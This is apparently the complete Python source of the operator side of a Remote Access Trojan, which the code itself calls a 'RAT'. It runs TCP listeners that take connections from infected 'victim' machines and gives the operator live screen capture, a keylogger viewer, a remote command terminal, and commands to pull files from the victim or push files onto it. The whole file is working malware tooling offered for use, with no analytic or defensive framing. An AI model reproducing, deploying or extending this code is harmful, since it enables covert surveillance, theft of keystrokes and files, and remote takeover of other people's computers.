import cv2
import time
import socket
import threading
import tkinter as tk
import datetime
import queue
import os
import sys
import pickle


# for screen capture
# global screencap_data, status, key_log_data, error, terminal_command, terminal_reply, payload_send_path, payload_path, payload_info, payload_list,payload_list_pos, send_mode
screencap_data = b''

# for key Log
key_log_data = ""

# command centre
status = {"screenCapture": False,
          "keyLog": False,
          "terminal": False}

# remote terminal
error = ""
terminal_command = queue.Queue()
terminal_reply = b''

# payload receive
payload_path = os.getcwd() + '\\'
payload_info = ""
payload_list = []
payload_list_pos = 0

# payload send
payload_data = queue.Queue()
payload_send_path = ""
send_mode = False

# client_address data
client_addr = {}

# Reset variables
keylogger = False

# Connected to device
connected = False

# current command client
current_client = None


# TCP Connections
class TcpConnections:

    def tcp_connection_command(self):
        global client_addr, connected

        ip = ""
        port = 12345
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        error = True
        while error:
            try:
                s.bind((ip, port))
                error = False
            except:
                time.sleep(1)
        s.listen(10)

        try:
            while True:
                client, address = s.accept()
                # client.setblocking(1)
                # print('Got connection from ', address, '\n')
                client_addr[client] = [address[0], address[1]]

                if not connected:
                    list_connections()

        except Exception as error:
            print("command")
            print(error)
        TcpConnections().tcp_connection_command()

    def tcp_connection_screenCap(self):
        global screencap_data, connected

        ip = ""
        port = 12346
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        error = True
        while error:
            try:
                s.bind((ip, port))
                error = False
            except:
                time.sleep(1)
        s.listen(10)

        try:
            while True:
                client, address = s.accept()
                print('Got connection from Screen', address, '\n')

                while True:
                    data = b''
                    while data[len(data) - 3:] != b'end':
                        data += client.recv(362144)
                    if data == b'terminateend':
                        s.close()
                        break
                    screencap_data = data
                    client.send(bytes("recv", "utf-8"))
                break
        except Exception as error:
            print("screenCap")
            print(error)
            pass
        TcpConnections().tcp_connection_screenCap()

    def tcp_connection_keyLog(self):
        ip = ""
        port = 12347
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        error = True
        while error:
            try:
                s.bind((ip, port))
                error = False
            except:
                time.sleep(1)
        s.listen(10)

        try:
            while True:
                client, address = s.accept()
                print('Got connection from Key', address, '\n')

                while True:
                    data = b''
                    while data[len(data) - 4:] != b'char' and data[len(data) - 4:] != b'l~g`':
                        data += client.recv(362144)
                    if data == b'terminatechar':
                        s.close()
                        break
                    controller(data)
                break
        # except SyntaxError:
        except Exception as error:
            print("keyLog")
            print(error)
            pass
        TcpConnections().tcp_connection_keyLog()

    def tcp_connection_remoteTerminal(self):
        global terminal_reply

        ip = ""
        port = 12348
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        error = True
        while error:
            try:
                s.bind((ip, port))
                error = False
            except:
                time.sleep(1)
        s.listen(10)

        try:
            while True:
                client, address = s.accept()
                print('Got connection from Terminal', address, '\n')

                while True:
                    command = terminal_command.get()
                    if command == "terminate":
                        s.close()
                        break
                    client.send(bytes(command, 'utf-8'))
                    terminal_reply = client.recv(362144)
                break
        # except SyntaxError:
        except Exception as error:
            print("terminal")
            print(error)
            pass
        TcpConnections().tcp_connection_remoteTerminal()

    def tcp_connection_payload(self):
        global send_mode

        ip = ""
        port = 12349
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        error = True
        while error:
            try:
                s.bind((ip, port))
                error = False
            except:
                time.sleep(1)
        s.listen(10)

        try:
            while True:
                client, address = s.accept()
                print('Got connection from Payload', address, '\n')

                while True:
                    if send_mode:
                        client.send(b'proceedpro~`')
                    else:
                        data = payload_data.get()
                        if data == "terminate":
                            s.close()
                            break
                        client.send(data)

                    result = "Incomplete"
                    data = b''
                    while result == "Incomplete":
                        data += client.recv(362144)
                        result = Payload.payload_receive(data)

                    if result == b'~termin@te~`':
                        payload_data.queue.clear()
                        s.close()
                        break
                    elif result == "Proceed Data":
                        Payload.payload_send(payload_send_path)
                    elif result == "Invalid Path":
                        send_mode = False
                        print("\nInvalid victim's destination file path!!\n")
                break
        # except SyntaxError:
        except Exception as error:
            print("payload")
            print(error)
            pass
        TcpConnections().tcp_connection_payload()


# TCP Connections Checks
def tcp_checks():
    global connected
    while True:
        try:
            for client in client_addr:
                try:
                    client.send(b'a')
                except:
                    if current_client is not None:
                        temp = client_addr[current_client][0]
                        client_addr.pop(client)

                        if client == current_client:
                            connected = False
                            print("\n\nLost connection from " + temp + "\nRestarting Process in 5 Seconds")
                            time.sleep(5)
                            os.system('TASKKILL /F /PID ' + str(os.getpid()) + ' && ' + os.path.basename(sys.argv[0]))
                        else:
                            if not connected:
                                list_connections()
                    else:
                        client_addr.pop(client)
                        list_connections()
        except:
            pass
        time.sleep(5)


#send command
def send_command():
    while True:
        if len(client_addr) != 0:
            if connected:
                command = input("Command: ")
                if command == "":
                    command = "empty"

                if command_centre(command):
                    current_client.send(bytes(command, 'utf-8'))
            else:
                command = input("")
                if command_centre(command):
                    current_client.send(b'start')
                time.sleep(1)
        else:
            time.sleep(1)


#list connections
def list_connections():
    if len(client_addr) != 0:
        num = 1
        data = "\n\nID No" + " " * 6 + "IP Address" + " " * 6 + "Port" + "\n" + "-" * 36 + "\n"
        for x in client_addr.values():
            data += str(num) + " " * 10 + x[0] + " " * 6 + str(x[1]) + "\n"
            print(data + "\n\nID No: ", end="")
            num += 1
    else:
        print("\nNo Clients Found. Searching For Connections...\n")


# Command Centre
def command_centre(command):
    global status, payload_send_path, send_mode, keylogger, connected, current_client

    check = command.split("|")

    if not connected:
        # Connect Device
        try:
            command = int(command)
            num = 1
            for x in client_addr:
                if num == command:
                    connected = True
                    current_client = x
                    x.send(b'start')
                    print("\nSuccessfully Connected to " + client_addr[current_client][0])
                    reply = "Available Commands:-\n"
                    reply += "screenCap"
                    reply += "\nkeyLog"
                    reply += "\nterminal"
                    reply += "\npayload"
                    reply += "\nquit"
                    reply += "\nreset"
                    print("\n" + reply + "\n")

                    return False
                num += 1

            print("\nInvalid command\n")
            list_connections()
            return False

        except:
            connected = False
            print("\nInvalid command\n")
            list_connections()
            return False
    else:
        # Disconnect From Device
        if command == "quit":
            if send_mode:
                print("\nCannot change client when sending data over. Try again when data transfer has been completed\n")
                return False
            temp = client_addr[current_client][0]
            reset()
            connected = False
            keylogger = True

            terminal_command.put("terminate")
            payload_data.put("terminate")

            current_client.send(b'quit')
            current_client = None
            print("\nSuccessfully disconnected from " + temp + "\n")

            list_connections()
            return False

        elif command == "reset":
            print("\nReseting Client's RAT\n")
            return True

        elif command == "delete":
            reply = input("\nARE YOU SURE YOU WANT TO DELETE RAT ON CLIENT SIDE. THIS PROCESS IS IRREVERSIBLE!! (Y/N): ")
            if reply.lower() == "y" or reply.lower() == "yes":
                print("Processing Request\nRequest Updated\n")
                return True
            else:
                print("\nTerminating Sequence\n")
                return False

        # Screen Capture
        elif command == "screenCap":
            reply = "Available Commands:-"
            reply += "\nscreenCap|start/stop"
            reply += "\nscreenCap|type|<color/monochrome>"
            reply += "\nscreenCap|quality|<number from 1 - 100>"
            print("\n" + reply + "\n")
            return False

        elif command == "screenCap|start":
            status["screenCapture"] = True
            print("\nUpdated Successfully\n")
            return True

        elif command == "screenCap|stop":
            status["screenCapture"] = False
            print("\nUpdated Successfully\n")
            return True

        elif check[0] == "screenCap" and check[1] == "type":
            if check[2] == "color" or check[2] == "grayscale" or check[2] == "monochrome" or check[2] == "blackwhite":
                print("\nUpdated Successfully\n")
                return True
            else:
                print("\nInvalid Command for type. Commands available for screen type:\n- color\n- monochrome\n")
                return False

        elif check[0] == "screenCap" and check[1] == "quality":
            try:
                int(check[2])
                print("\nUpdated Successfully\n")
                return True
            except:
                print("\nInvalid Data Type. Value of quality has to be a number\n")
                return False

        # Key Logger
        elif command == "keyLog":
            reply = "Available Commands:-"
            reply += "\nkeyLog|start/stop"
            reply += "\nkeyLog|download"
            print("\n" + reply + "\n")
            return False

        elif command == "keyLog|start":
            status["keyLog"] = True
            print("\nUpdated Successfully\n")
            return True

        elif command == "keyLog|stop":
            status["keyLog"] = False
            print("\nUpdated Successfully\n")
            return True

        elif command == "keyLog|download":
            print("\nUpdated Successfully\n")
            return True

        # Remote Terminal
        elif command == "terminal":
            reply = "Available Commands:-"
            reply += "\nterminal|start"
            print("\n" + reply + "\n")
            return False

        elif command == "terminal|start":
            status["terminal"] = True
            print("\nUpdated Successfully\n")
            return True

        # Payload
        elif command == "payload":
            reply = "Available Commands:-"
            reply += "\npayload|send-me|<victim's source file path>"
            reply += "\npayload|transfer|<your source file path>|<victim's destination file path>"
            print("\n" + reply + "\n")
            return False

        elif check[0] == "payload" and check[1] == "send-me":
            if payload_data.empty() and not send_mode:
                send_mode = True
                print("\nVerifying Command. Transfer of data will take time\n")
                path = bytes(check[2].replace("/", "\\"), "utf-8") + b'sen~`'
                payload_data.put(path)
            else:
                print("\nPlease wait for other files to finish transferring\n")
            return False

        elif check[0] == "payload" and check[1] == "transfer":
            if payload_data.empty() and not send_mode:
                try:
                    path = bytes(check[3].replace("/", "\\"), "utf-8") + b'pat~`'
                    print("\nVerifying Command. Transfer of data will take time\n")
                    payload_data.put(path)

                    payload_send_path = check[2].replace("/", "\\")
                    if "." not in payload_send_path and not payload_send_path.endswith("\\"):
                        payload_send_path += "\\"

                except:
                    print("\nInvalid Command\n")
            else:
                print("\nPlease wait for other files to finish transferring\n")
            return False

        else:
            reply = "Invalid Command. Available Commands:-\n"
            reply += "screenCap"
            reply += "\nkeyLog"
            reply += "\nterminal"
            reply += "\npayload"
            reply += "\nquit"
            reply += "\nreset"
            print("\n" + reply + "\n")
            return False


#reset
def reset():
    global screencap_data, key_log_data, status, error, terminal_reply, payload_path, payload_info, payload_list, payload_list_pos, payload_send_path, send_mode, keylogger

    # for Screen Cap
    screencap_data = b''

    # for key Log
    key_log_data = ""

    # command centre
    status = {"screenCapture": False,
              "keyLog": False,
              "terminal": False}

    # remote terminal
    error = ""
    terminal_command.queue.clear()
    terminal_reply = b''

    # payload receive
    payload_path = os.getcwd() + '\\'
    payload_info = ""
    payload_list = []
    payload_list_pos = 0

    # payload send
    payload_data.queue.clear()
    payload_send_path = ""
    send_mode = False

    # Reset variables
    keylogger = False


# Data movement control for Key Logger
def controller(data):
    global key_log_data

    info = data[len(data) - 4:]
    new_data = data[:len(data) - 4]

    if info == b'char':
        new_data.replace(b'char', b'')
        key_log_data = bytes.decode(new_data, "utf-8")

    if info == b'l~g`':
        temp = new_data.split(b'~~', 1)
        name = bytes.decode(temp[0], "utf-8")
        content = temp[1]

        file = open(name + ".txt", 'wb')
        file.write(content)
        file.close()


# Screen Capture
def screen_cap():
    def display():
        try:
            img_data = screencap_data
            content = open("receive.jpg", 'wb')
            content.write(img_data)
            content.close()

            img = cv2.imread("receive.jpg")
            cv2.imshow("Screen Capture", img)
            cv2.waitKey(1)

        except:
            pass

    while True:
        try:
            if status["screenCapture"]:
                display()
            else:
                cv2.destroyAllWindows()
                time.sleep(5)
                screen_cap()
        except Exception as error:
            print(error)


# Key Log
def key_log():
    global key_log_data, status

    def insert():
        global key_log_data, keylogger

        if keylogger:
            keylogger = False
            root.destroy()
        else:
            box.configure(state=tk.NORMAL)
            box.insert(tk.END, key_log_data)
            if key_log_data != "":
                box.see(tk.END)
            box.configure(state=tk.DISABLED)
            key_log_data = ""
            root.after(10, insert)

    while True:
        if status["keyLog"]:
            root = tk.Tk()
            root.title("Live KeyLog")
            scrollbar = tk.Scrollbar()
            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
            box = tk.Text(width=90, height=30, yscrollcommand=scrollbar.set, font=("Terminal font family", 10))
            box.pack(pady=20)
            key_log_data = datetime.datetime.now().strftime("%I:%M:%S %p :>>: ") + key_log_data
            insert()

            root.mainloop()
            status["keyLog"] = False

        time.sleep(5)


# Remote Terminal
def terminal():
    class ConsoleText(tk.Text):

        def __init__(self, master=None, **kw):
            tk.Text.__init__(self, master, **kw)
            self.insert('1.0', '>>> ')  # first prompt
            # create input mark
            self.mark_set('input', 'insert')
            self.mark_gravity('input', 'left')
            # create proxy
            self._orig = self._w + "_orig"
            self.tk.call("rename", self._w, self._orig)
            self.tk.createcommand(self._w, self._proxy)
            # binding to Enter key
            self.bind("<Return>", self.enter)

        def _proxy(self, *args):
            global error

            largs = list(args)
            if args[0] == 'insert':
                if self.compare('insert', '<', 'input'):
                    # move insertion cursor to the editable part
                    self.mark_set('insert', 'end')  # you can change 'end' with 'input'
            elif args[0] == "delete":
                try:
                    if self.compare(args[1], '<', 'input'):
                        if len(largs) == 2:
                            return # don't delete anything
                        largs[1] = 'input'  # move deletion start at 'input'
                except:
                    pass
            try:
                result = self.tk.call((self._orig,) + tuple(largs))
                error = result
            except:
                result = error
            return result

        def check_system(self):
            global terminal_reply

            if terminal_reply == b'':
                self.configure(state=tk.DISABLED)
                self.after(500, self.check_system)
            else:
                self.configure(state=tk.NORMAL)
                terminal_reply = "\n" + bytes.decode(terminal_reply, "utf-8")
                self.insert('end', terminal_reply)
                self.see(tk.END)
                terminal_reply = b''
                # move input mark
                self.mark_set('input', 'insert')
            return "break"  # don't execute class method that inserts a newline

        def enter(self, event):

            command = self.get('input', 'end')
            terminal_command.put(command)
            self.check_system()

    while True:

        if status["terminal"]:
            root = tk.Tk()
            root.title("Remote Terminal")
            scrollbar = tk.Scrollbar()
            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
            tfield = ConsoleText(root, bg='black', fg='white', insertbackground='white', yscrollcommand=scrollbar.set, font=("Terminal font family", 10))
            tfield.pack()
            root.mainloop()
            status["terminal"] = False
            terminal_reply = b''

        time.sleep(5)


# Payload
class Payload:
    def payload_send(path):
        if os.path.exists(path):
            path_d = []
            for directory in os.walk(path):
                path_d.append(directory)

            if len(path_d) == 0:
                file_name = path.rsplit("\\", 1)[1]
                try:
                    content = open(path, "rb")
                    data = bytes(file_name + "?", "utf-8") + content.read() + b'dat~`'
                    payload_data.put(data)
                except:
                    print("Error has occurred. Not enough permissions available to read file!!")

            else:
                payload_data_pickled = pickle.dumps(path_d) + b'inf~`'
                payload_data.put(payload_data_pickled)

                for loop1 in range(len(path_d)):
                    path_r, direc, file = path_d[loop1]

                    for all_files in file:
                        try:
                            content = open(path_r + "\\" + all_files, "rb")
                            data = bytes(all_files + "?", "utf-8") + content.read() + b'dat~`'
                        except:
                            data = bytes(all_files + "?", "utf-8") + b'Not Enough Permission' + b'dat~`'

                        payload_data.put(data)

        else:
            print("Invalid Source Path. Provide full path!")

    def payload_receive(data):
        global payload_path, payload_info, payload_list, payload_list_pos, send_mode

        header_type = data[len(data) - 5:]
        content = data[:len(data) - 5]

        if data == b'~termin@te~`':
            return data

        elif header_type == b'msg~`':
            content = bytes.decode(content, "utf-8")
            return content

        elif header_type == b'inf~`':
            payload_info = pickle.loads(content)

            fake_path = payload_info[0][0]
            if fake_path.endswith("\\"):
                fake_path = fake_path.rsplit("\\", 1)[0]
            actual_path = payload_path + fake_path.rsplit("\\", 1)[1]

            def trial(path):
                global payload_path

                try:
                    os.mkdir(path)
                    payload_path = path
                except:
                    path += "_"
                    trial(path)
                return path

            trial(actual_path)

            for loop1 in range(len(payload_info)):
                path_r, direc, file = payload_info[loop1]
                if path_r.endswith("\\"):
                    path_r = path_r.rsplit("\\", 1)[0]
                path_r = path_r.replace(fake_path, payload_path)

                for loop2 in direc:
                    os.mkdir(path_r + "\\" + loop2)

                for loop3 in file:
                    payload_list.append(path_r + "\\" + loop3)

            return "Proceed"

        elif header_type == b'dat~`':
            try:
                data_cur = content.split(b'?', 1)[1]

                if len(payload_list) == 0:
                    file_name = bytes.decode(content.split(b'?', 1)[0], "utf-8")
                    path = payload_path + file_name
                else:
                    path = payload_list[payload_list_pos]
                    payload_list_pos += 1

                content = open(path, "wb")
                content.write(data_cur)
            except Exception as error:
                print(error)

            return "Proceed"

        elif header_type == b'don~`':
            send_mode = False
            payload_path = os.getcwd() + '\\'

            return "Proceed"

        else:
            return "Incomplete"


print("Searching For Connections...")
if __name__ == '__main__':
    p1 = threading.Thread(target=TcpConnections.tcp_connection_command, args=(0,))
    p2 = threading.Thread(target=TcpConnections.tcp_connection_screenCap, args=(0,))
    p3 = threading.Thread(target=TcpConnections.tcp_connection_keyLog, args=(0,))
    p4 = threading.Thread(target=TcpConnections.tcp_connection_remoteTerminal, args=(0,))
    p5 = threading.Thread(target=TcpConnections.tcp_connection_payload, args=(0,))

    p6 = threading.Thread(target=send_command)
    p7 = threading.Thread(target=tcp_checks)

    p8 = threading.Thread(target=screen_cap)
    p9 = threading.Thread(target=key_log)
    p10 = threading.Thread(target=terminal)

    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
